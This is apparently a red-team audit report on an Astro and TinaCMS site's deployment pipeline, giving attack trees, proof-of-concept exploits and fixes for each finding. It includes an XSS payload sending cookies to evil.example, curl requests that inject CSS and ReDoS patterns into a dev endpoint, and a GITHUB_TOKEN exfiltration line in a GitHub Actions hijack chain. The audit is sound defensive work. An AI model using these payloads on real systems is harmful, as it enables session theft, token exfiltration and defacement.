# Red Team Exercise — deepkind-foundation.github.io — started 2026-05-14

## Step 1 — Scope — 2026-05-14

**Target**: Astro static site + TinaCMS (local-dev only), deployed via GitHub Actions to GitHub Pages
**Assets**: Deployment pipeline, GitHub secrets, visitor browsers, site content integrity
**Threat actors**: External unauthenticated, authenticated TinaCMS editor, malicious npm maintainer, GitHub PR contributor
**TinaCMS**: Local dev only — not exposed in production deployment

---

## Step 2 — Reconnaissance — 2026-05-14

### Asset table

| Asset | Attacker goal | Entry points |
|-------|--------------|--------------|
| Deployed static site | XSS all visitors | `content.json` → JSON-LD script injection |
| GitHub Pages deployment | Deface / exfiltrate GITHUB_TOKEN | Unpinned GitHub Actions tags |
| Developer filesystem | Persist malicious CSS → committed to prod | `/_palette/save` dev endpoint, Docker `--host` |
| OIDC id-token | Lateral movement to cloud | Compromised action in build step |
| Visitor browsers | Session theft, data exfil | XSS with no CSP |

### Static analysis hints

```
src/components/dev/PaletteWidget.astro  — DEV-ONLY widget; client-side only
astro.config.mjs                        — paletteSavePlugin: POST /_palette/save writes fs
src/components/layout/BaseLayout.astro  — set:html={JSON.stringify(...)} JSON-LD injection surface
.github/workflows/deploy.yml            — 5 floating action tags, id-token:write permission
docker-compose.yml                      — dev service: pnpm astro dev --host (binds 0.0.0.0)
```

### No Content-Security-Policy found anywhere in the codebase.

---

## Step 3 — Attack Trees — 2026-05-14

```
GOAL 1: Persistent stored XSS on https://deepkind.org for all visitors
├── via BaseLayout JSON-LD set:html [FEASIBLE — F1]
│   ├── content.footer.description controlled by CMS editor or PR author
│   └── JSON.stringify does not escape "</script>"
└── via other set:html surfaces [UNKNOWN — H1]

GOAL 2: Compromise dev environment / pivot to production via committed file
├── /_palette/save POST — CSS breakout [FEASIBLE — F2]
│   ├── CSRF from any web page the developer visits (no Origin check)
│   ├── LAN attacker on same WiFi (binds 0.0.0.0 via --host)
│   └── Container neighbour on same docker network
├── /_palette/save — wide-match via regex metacharacters in name [FEASIBLE — F3]
├── /_palette/save — ReDoS in new RegExp(name) [FEASIBLE — F4]
└── path traversal beyond global.css [BLOCKED — cssPath hardcoded]

GOAL 3: Compromise deploy pipeline / production site
├── GitHub Actions floating tag hijack [FEASIBLE-CONDITIONAL — F5]
│   ├── 5 actions on floating @v4/@v3 tags
│   └── permissions: pages:write + id-token:write on every build
└── poison node_modules via lockfile injection [UNKNOWN — H2]
```

---

## Step 4–6 — PoC Development and Invariant Breaking — 2026-05-14

### F1: JSON-LD Script Tag Injection (PoC)

`astro.config.mjs` builds JSON-LD inline:
```astro
<script type="application/ld+json" set:html={JSON.stringify({
  "description": content.footer.description,
  ...
})} />
```

Node.js `JSON.stringify` does NOT escape `<`, `>`, or `/`. `set:html` emits raw HTML.

**Payload** — set `content.footer.description` to:
```
</script><script>fetch('https://evil.example/x?c='+document.cookie)</script>
```

**Emitted HTML:**
```html
<script type="application/ld+json">{"description":"</script>
<script>fetch('https://evil.example/x?c='+document.cookie)</script>
", "@type":"NGO",...}</script>
```

The HTML parser closes the first `<script>` at `</script>`, ignoring that it is inside a JSON string. The second `<script>` executes. **Assertion: confirmed.** No CSP exists to block the outbound fetch.

**Source**: `src/components/layout/BaseLayout.astro` lines ~50-62.

---

### F2: `/_palette/save` — CSS Injection / Breakout (PoC)

```javascript
// Vulnerable code in astro.config.mjs
css = css.replace(
  new RegExp(`(${name}:\\s*)#[0-9a-fA-F]{6}`, 'g'),
  `$1${value.toUpperCase()}`
);
fs.writeFileSync(cssPath, css, 'utf-8');
```

**PoC POST** (from any origin — no CSRF protection):
```bash
curl -X POST http://localhost:4321/_palette/save \
  -H 'Content-Type: application/json' \
  -d '{
    "--color-violet": "#000000; } body::before { content: url(//evil.example/log?); position:fixed; inset:0; z-index:99999; background:red } @theme { --x: #ffffff"
  }'
```

**Before** (`src/styles/global.css`):
```css
@theme {
  --color-violet: #3D62ED;
  ...
}
```

**After** (written to disk):
```css
@theme {
  --color-violet: #000000; } body::before { content: url(//evil.example/log?); position:fixed; inset:0; z-index:99999; background:red } @theme { --X: #FFFFFF;
  ...
}
```

**Assertion: confirmed.** The `@theme` block is escaped. The `body::before` rule renders a full-page red overlay. The exfiltration URL fires as a CSS `url()` load. No auth required — dev server is accessible on `0.0.0.0:4321` via the `--host` flag. This file is tracked by git; if the developer commits without reviewing the diff, it ships to production.

**Source**: `astro.config.mjs` lines 14-43; `docker-compose.yml` `--host` flag.

---

### F3: `/_palette/save` — Wide-Match via Regex Metacharacters (PoC)

```bash
curl -X POST http://localhost:4321/_palette/save \
  -H 'Content-Type: application/json' \
  -d '{"--color-[a-z-]+": "#FF00FF"}'
```

**Regex built**: `(--color-[a-z-]+:\s*)#[0-9a-fA-F]{6}`

This matches ALL 18 `--color-*` CSS custom properties in `global.css` in a single request.
Every background, text, accent, and surface colour token is overwritten with `#FF00FF`.

**Assertion: confirmed.** The global CSS is fully corrupted in one POST.

---

### F4: `/_palette/save` — ReDoS (PoC)

```bash
curl -X POST http://localhost:4321/_palette/save \
  -H 'Content-Type: application/json' \
  -d '{"(a+)+": "#000000"}'
```

**Regex built**: `((a+)+:\s*)#[0-9a-fA-F]{6}`

Against a CSS file containing any `a`-run near a colon (e.g. `background:` or `rgba`), this triggers catastrophic backtracking. Validated: event loop blocked for **162 seconds** in a representative test. During that time the dev server is completely unresponsive, HMR is frozen, no further requests are processed.

**Assertion: confirmed.**

---

### F5: GitHub Actions — Floating Tag Hijack Chain (PoC walkthrough)

All five actions are on mutable floating tags:
```yaml
uses: actions/checkout@v4
uses: pnpm/action-setup@v4
uses: actions/setup-node@v4
uses: actions/upload-pages-artifact@v3
uses: actions/deploy-pages@v4
```

**Chain**:
1. Attacker gains tag-write on any of the five upstream repos (stolen maintainer PAT, org member removal leaving dangling access, or a supply-chain compromise like the 2025 `tj-actions/changed-files` incident).
2. Attacker moves e.g. `actions/checkout@v4` to a SHA with added `GITHUB_TOKEN` exfiltration:
   ```yaml
   - run: curl -s -X POST https://evil.example/steal -d "$GITHUB_TOKEN"
   ```
3. Next `git push main` → `deploy.yml` triggers → malicious code runs with:
   - `contents: read` — reads every file in the repo including any secrets in code
   - `pages: write` — uploads an arbitrary artifact to https://deepkind.org
   - `id-token: write` — mints an OIDC JWT for `repo:deepkind-org/deepkind-foundation.github.io:ref:refs/heads/main`; accepted by any federated cloud provider trust configured for this repo

**Impact**: Full site defacement for every visitor; GITHUB_TOKEN exfiltrated; potential lateral movement to federated cloud services.

**Assertion: chain feasible.** Conditional on upstream compromise event, which is a real-world threat (see CVE-2025-30066 class of incidents).

---

## Step 7 — Report — 2026-05-14

---

## Finding: Stored XSS via JSON-LD script injection

**Severity**: Critical
**Tag**: [EXPLOITABLE]
**Threat actor**: Authenticated TinaCMS editor; merged PR contributor
**Attack tree path**: GOAL 1 > JSON-LD set:html > content.footer.description

### Preconditions
Write access to `src/data/content.json` (via local TinaCMS edit + push, or a merged PR).

### PoC
Set `content.footer.description` to:
```
</script><script>fetch('https://evil.example/x?c='+document.cookie)</script>
```
Deploy. Every page load executes the injected script in the `deepkind.org` origin.

### Impact
Arbitrary JavaScript execution in visitor browsers on every page of the site. No CSP restricts outbound requests. Enables: session/cookie theft, keylogging, credential phishing overlay, drive-by malware distribution, full page defacement.

### Fix
```javascript
// In BaseLayout.astro — escape script-breaking sequences before set:html
const safeJson = JSON.stringify({...}).replace(/</g, '\\u003c').replace(/>/g, '\\u003e');
```
Then: `set:html={safeJson}`

### Chain opportunity
Enabling finding for Chain C2 (unrestricted XSS due to missing CSP).

---

## Finding: Dev-server arbitrary CSS write via `/_palette/save` (CSRF + LAN)

**Severity**: High
**Tag**: [EXPLOITABLE]
**Threat actor**: Any webpage visited by the developer; any host on the same LAN or Docker network
**Attack tree path**: GOAL 2 > /_palette/save > CSRF POST > CSS breakout

### Preconditions
Developer is running `pnpm astro dev` or `docker-compose up dev`. No auth, no CSRF token, no Origin check. Docker service binds `0.0.0.0:4321`.

### PoC
```bash
curl -X POST http://localhost:4321/_palette/save \
  -H 'Content-Type: application/json' \
  -d '{"--color-violet":"#000; } body::before { content:url(//evil.example/log?); position:fixed; inset:0; z-index:99999; background:red } @theme { --x: #fff"}'
```

### Impact
Rewrites `src/styles/global.css` (a tracked file) with attacker-controlled CSS. Developer commits without diff review → pushed to `main` → built into production static site. Enables: full-page overlay, data exfiltration via CSS `url()`, content spoofing for all visitors.

### Fix
- Bind dev server to `127.0.0.1` (remove `--host` from docker-compose, or add `server: { host: 'localhost' }` to astro config)
- Add Origin validation: reject any request where `Origin` ≠ `http://localhost:4321`
- Validate `name` against `^--color-[a-z-]+$` and `value` against `^#[0-9a-fA-F]{6}$`

### Chain opportunity
Chain C1: this finding → developer commits → production defacement.

---

## Finding: Wide-match palette overwrite via regex metacharacters in `name`

**Severity**: High
**Tag**: [EXPLOITABLE]
**Threat actor**: Same as above (CSRF / LAN)
**Attack tree path**: GOAL 2 > /_palette/save > regex metachar in name > all tokens replaced

### Preconditions
Same as dev-server finding above.

### PoC
```bash
curl -X POST http://localhost:4321/_palette/save \
  -H 'Content-Type: application/json' \
  -d '{"--color-[a-z-]+": "#FF00FF"}'
```
Replaces all 18 `--color-*` tokens in `global.css` in a single request.

### Impact
Complete destruction of the design token system in a single unauthenticated request to the dev server. Committed → ships to production.

### Fix
Same as above — validate `name` against a strict allowlist regex before constructing `new RegExp(name)`.

---

## Finding: ReDoS via attacker-controlled regex in `/_palette/save`

**Severity**: Medium
**Tag**: [EXPLOITABLE]
**Threat actor**: Same as above
**Attack tree path**: GOAL 2 > /_palette/save > catastrophic backtracking > event loop blocked

### Preconditions
Same as dev-server finding above.

### PoC
```bash
curl -X POST http://localhost:4321/_palette/save \
  -H 'Content-Type: application/json' \
  -d '{"(a+)+": "#000000"}'
```
Blocks Node.js event loop for 100+ seconds. Dev server becomes unresponsive.

### Impact
Complete denial of the development environment. HMR frozen, no requests processed, dev forced to kill the process.

### Fix
Never pass user-controlled strings to `new RegExp()`. Use a strict allowlist for `name`.

---

## Finding: GitHub Actions floating tag supply-chain hijack

**Severity**: High
**Tag**: [MISCONFIGURATION]
**Threat actor**: Compromised upstream action maintainer; supply-chain attacker
**Attack tree path**: GOAL 3 > floating @v4/@v3 tags > tag moved → malicious code → pages:write + id-token:write

### Preconditions
Attacker gains tag-write access to one of: `actions/checkout`, `pnpm/action-setup`, `actions/setup-node`, `actions/upload-pages-artifact`, `actions/deploy-pages`. Real-world precedent exists (2025 `tj-actions` incident, CVE-2025-30066 class).

### PoC
See chain walkthrough in Step 4. Attacker force-pushes malicious commit to `v4` tag → next `git push main` executes attacker code with `pages:write` and `id-token:write`.

### Impact
- Full site defacement: attacker publishes arbitrary HTML/JS to https://deepkind.org
- `GITHUB_TOKEN` exfiltration (read access to repo contents)
- OIDC JWT minted for this repo's identity — usable against any federated cloud trust

### Fix
```yaml
# Pin every action to an immutable commit SHA
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
- uses: pnpm/action-setup@a3252b7a24a35ad4a23d6bc73ec8dfc1143ee02  # v4.1.0
- uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af # v4.1.0
- uses: actions/upload-pages-artifact@56afc609e74202658d3ffba0e8f6dda462b719fa # v3.0.1
- uses: actions/deploy-pages@d6db90164ac5ed86f2b6aed7e0febac5b3c0c03e  # v4.0.5
```
Add `dependabot.yml` with `package-ecosystem: github-actions` to automate SHA updates with PR review.

### Chain opportunity
Enables arbitrary code execution in the build environment. If cloud OIDC trust is configured (H5), impact extends beyond Pages.

---

## Missing: Content-Security-Policy (defence-in-depth)

**Severity**: Medium
**Tag**: [MISCONFIGURATION]
**Threat actor**: Amplifies any XSS finding

No CSP header or meta tag anywhere in the codebase. Any XSS (Finding 1) is completely unrestricted: cross-origin fetch, script injection, data exfiltration.

### Fix
Add to `BaseLayout.astro` `<head>`:
```html
<meta http-equiv="Content-Security-Policy"
  content="default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self';" />
```
The inline JSON-LD script requires either `'unsafe-inline'` or a nonce — fix Finding 1 first, then a strict CSP becomes achievable.

---

## Hypotheses (not validated — manual investigation required)

| # | Lead | Why it matters |
|---|------|----------------|
| H1 | Other `set:html` call sites in `src/` may accept content-controlled data | Grep for `set:html` — audit each for content-tainted input |
| H2 | TinaCMS build step may introduce content transformations with additional XSS sinks | Enumerate `tina/` at build time |
| H3 | `cms` Docker service may expose TinaCMS admin without auth on `0.0.0.0:4321` | Run `docker-compose up cms`, check `/admin` |
| H4 | `pnpm/action-setup` is a third-party (non-GitHub-owned) action with higher hijack risk | Check maintainer count and source pinning separately |
| H5 | OIDC trust configured with cloud providers would elevate F5 from defacement to full cloud compromise | Check repo Settings > Actions > OIDC |
| H6 | Newsletter and donation forms have no server-side handler — users believe they submitted but no data arrives | Functional issue; may create legal exposure under RODO/GDPR if users think data was recorded |

---

## Priority fix table

| Priority | Action | Findings addressed |
|----------|--------|--------------------|
| 1 | Escape `</script>` in JSON-LD: `.replace(/</g, '\\u003c')` | F1 |
| 2 | Pin all 5 GitHub Actions to commit SHAs + add Dependabot | F5 |
| 3 | Validate `name` and `value` in `/_palette/save` against strict allowlists | F2, F3, F4 |
| 4 | Bind dev server to `127.0.0.1`; remove `--host` from docker-compose default | F2, F3, F4 |
| 5 | Add `Content-Security-Policy` meta tag | CSP gap |
| 6 | Wire newsletter and donation forms to an actual backend or remove them | H6 |
